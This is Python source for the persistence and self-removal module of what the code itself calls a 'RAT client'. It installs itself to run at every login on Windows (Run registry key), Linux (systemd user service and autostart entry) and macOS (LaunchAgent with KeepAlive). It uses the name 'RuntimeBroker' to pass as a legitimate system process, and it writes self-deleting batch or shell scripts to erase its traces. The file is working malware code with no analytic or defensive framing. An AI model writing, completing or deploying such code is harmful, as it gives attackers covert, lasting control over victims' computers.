
import os
import platform
import shutil
import subprocess
import sys
import shlex
import logging

PERSISTENCE_NAME = "RuntimeBroker"

def _get_script_path() -> str:
    """Returns the path of the currently running script or executable."""
    if getattr(sys, 'frozen', False):
        return os.path.realpath(sys.executable)
    else:
        # sys.argv[0] is more reliable for the entry script than __file__ when imported
        return os.path.realpath(sys.argv[0])

def _manage_persistence_windows(enable=True) -> str:
    """Manages persistence on Windows using the Registry."""
    try:
        exe_path = sys.executable
        dest_folder = os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")), PERSISTENCE_NAME)
        dest_path = os.path.join(dest_folder, f"{PERSISTENCE_NAME}.exe")
        reg_key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

        if enable:
            os.makedirs(dest_folder, exist_ok=True)
            try:
                if os.path.realpath(exe_path).lower() != os.path.realpath(dest_path).lower():
                    shutil.copyfile(exe_path, dest_path)
            except Exception as e:
                logging.error(f"Failed to copy executable for persistence: {e}")
                # Continue anyway, maybe we can at least set the registry key for the current path
                dest_path = exe_path

            cmd = f'reg add HKCU\\{reg_key_path} /v {PERSISTENCE_NAME} /t REG_SZ /d "{dest_path}" /f'
            subprocess.run(cmd, shell=True, check=True, capture_output=True, text=True)
            return f"Persistence enabled. Client will start on next login from '{dest_path}'."
        else:
            cmd = f'reg delete HKCU\\{reg_key_path} /v {PERSISTENCE_NAME} /f'
            subprocess.run(cmd, shell=True, check=False, capture_output=True, text=True)
            if os.path.exists(dest_path):
                try:
                    # Try to kill if running from that path
                    subprocess.run(f"taskkill /f /im {os.path.basename(dest_path)}", shell=True, check=False, capture_output=True)
                    os.remove(dest_path)
                    os.rmdir(dest_folder)
                except OSError:
                    pass
            return "Persistence successfully removed."
    except (subprocess.CalledProcessError, FileNotFoundError, PermissionError) as e:
        return f"Error managing Windows persistence: {e}"
    except Exception as e:
        return f"An unexpected error occurred during Windows persistence: {e}"

def _manage_persistence_linux(enable=True) -> str:
    """Manages persistence on Linux using systemd user services and/or .desktop autostart."""
    try:
        script_path = _get_script_path()
        exec_command = f"{sys.executable} {shlex.quote(script_path)}" if not getattr(sys, 'frozen', False) else shlex.quote(script_path)

        systemd_success = False
        desktop_success = False

        # 1. Systemd User Service
        user_config_dir = os.path.expanduser("~/.config/systemd/user")
        service_path = os.path.join(user_config_dir, f"{PERSISTENCE_NAME}.service")

        if enable:
            try:
                os.makedirs(user_config_dir, exist_ok=True)
                service_content = f"""[Unit]
Description=Runtime Broker Service
After=network.target

[Service]
Type=simple
ExecStart={exec_command}
Restart=always

[Install]
WantedBy=default.target
"""
                with open(service_path, "w") as f:
                    f.write(service_content)

                if shutil.which("systemctl"):
                    subprocess.run(["systemctl", "--user", "daemon-reload"], check=True, capture_output=True)
                    subprocess.run(["systemctl", "--user", "enable", f"{PERSISTENCE_NAME}.service"], check=True, capture_output=True)
                    subprocess.run(["systemctl", "--user", "start", f"{PERSISTENCE_NAME}.service"], check=True, capture_output=True)
                    systemd_success = True
            except Exception as e:
                logging.warning(f"Systemd persistence failed: {e}")

            # 2. XDG Autostart Desktop File (Fallback/Dual)
            autostart_dir = os.path.expanduser("~/.config/autostart")
            desktop_path = os.path.join(autostart_dir, f"{PERSISTENCE_NAME}.desktop")
            try:
                os.makedirs(autostart_dir, exist_ok=True)
                desktop_content = f"""[Desktop Entry]
Type=Application
Name={PERSISTENCE_NAME}
Exec={exec_command}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
"""
                with open(desktop_path, "w") as f:
                    f.write(desktop_content)
                desktop_success = True
            except Exception as e:
                logging.warning(f"Desktop autostart persistence failed: {e}")

            if systemd_success and desktop_success:
                return "Persistence enabled using systemd and desktop autostart."
            elif systemd_success:
                return "Persistence enabled using systemd user service."
            elif desktop_success:
                return "Persistence enabled using desktop autostart."
            else:
                return "Failed to enable Linux persistence through standard methods."
        else:
            # Disable
            results = []
            if os.path.exists(service_path):
                if shutil.which("systemctl"):
                    subprocess.run(["systemctl", "--user", "stop", f"{PERSISTENCE_NAME}.service"], check=False, capture_output=True)
                    subprocess.run(["systemctl", "--user", "disable", f"{PERSISTENCE_NAME}.service"], check=False, capture_output=True)
                os.remove(service_path)
                results.append("systemd service removed")

            autostart_dir = os.path.expanduser("~/.config/autostart")
            desktop_path = os.path.join(autostart_dir, f"{PERSISTENCE_NAME}.desktop")
            if os.path.exists(desktop_path):
                os.remove(desktop_path)
                results.append("desktop autostart removed")

            return f"Persistence removed ({', '.join(results) if results else 'none found'})."
    except Exception as e:
        return f"Error managing Linux persistence: {e}"

def _manage_persistence_macos(enable=True) -> str:
    """Manages persistence on macOS using Launch Agents."""
    try:
        launch_agents_dir = os.path.expanduser("~/Library/LaunchAgents")
        plist_path = os.path.join(launch_agents_dir, f"com.{PERSISTENCE_NAME.lower()}.plist")

        if enable:
            os.makedirs(launch_agents_dir, exist_ok=True)
            script_path = _get_script_path()
            exec_args = [sys.executable, script_path] if not getattr(sys, 'frozen', False) else [script_path]

            args_xml = "\n        ".join(f"<string>{arg}</string>" for arg in exec_args)

            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.{PERSISTENCE_NAME.lower()}</string>
    <key>ProgramArguments</key>
    <array>
        {args_xml}
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
"""
            with open(plist_path, "w") as f:
                f.write(plist_content)

            if shutil.which("launchctl"):
                subprocess.run(["launchctl", "load", plist_path], check=True, capture_output=True)
            return "Persistence enabled using macOS Launch Agent."
        else:
            if os.path.exists(plist_path):
                if shutil.which("launchctl"):
                    subprocess.run(["launchctl", "unload", plist_path], check=False, capture_output=True)
                os.remove(plist_path)
                return "Persistence removed (macOS Launch Agent)."
            return "Persistence Launch Agent not found."
    except Exception as e:
        return f"Error managing macOS persistence: {e}"

def manage_persistence(enable=True) -> str:
    """Manages client persistence across different operating systems."""
    system = platform.system()
    if system == "Windows":
        return _manage_persistence_windows(enable)
    elif system == "Linux":
        return _manage_persistence_linux(enable)
    elif system == "Darwin":
        return _manage_persistence_macos(enable)
    else:
        return f"Persistence is not supported on this OS: {system}."

def uninstall_client() -> str:
    """Removes persistence and schedules the client for self-deletion."""
    try:
        persistence_msg = manage_persistence(enable=False)
        client_path = _get_script_path()
        
        if platform.system() == "Windows":
            batch_content = f"""
@echo off
echo "Uninstalling RAT client..."
timeout /t 3 /nobreak > NUL
taskkill /f /im \"{os.path.basename(client_path)}\" > NUL
del \"{client_path}\" 
del \"%~f0\"
"""
            batch_path = os.path.join(os.environ.get("TEMP", os.path.expanduser("~")), "uninstall.bat")
            with open(batch_path, "w") as f:
                f.write(batch_content)
            subprocess.Popen(f'\"{batch_path}\" ', shell=True, creationflags=getattr(subprocess, 'CREATE_NEW_PROCESS_GROUP', 0))
        else:  # Linux and macOS
            script_content = f"""
#!/bin/sh
echo "Uninstalling RAT client..."
sleep 3
kill -9 {os.getpid()}
rm -f \"{client_path}\" 
rm -- \"$0\"
"""
            script_path = os.path.join(os.path.expanduser("~"), ".uninstall.sh")
            with open(script_path, "w") as f:
                f.write(script_content)
            os.chmod(script_path, 0o755)
            subprocess.Popen([script_path])

        return f"{persistence_msg}\nUninstallation process started. The client will self-destruct shortly."

    except Exception as e:
        return f"Error during uninstallation: {e}"
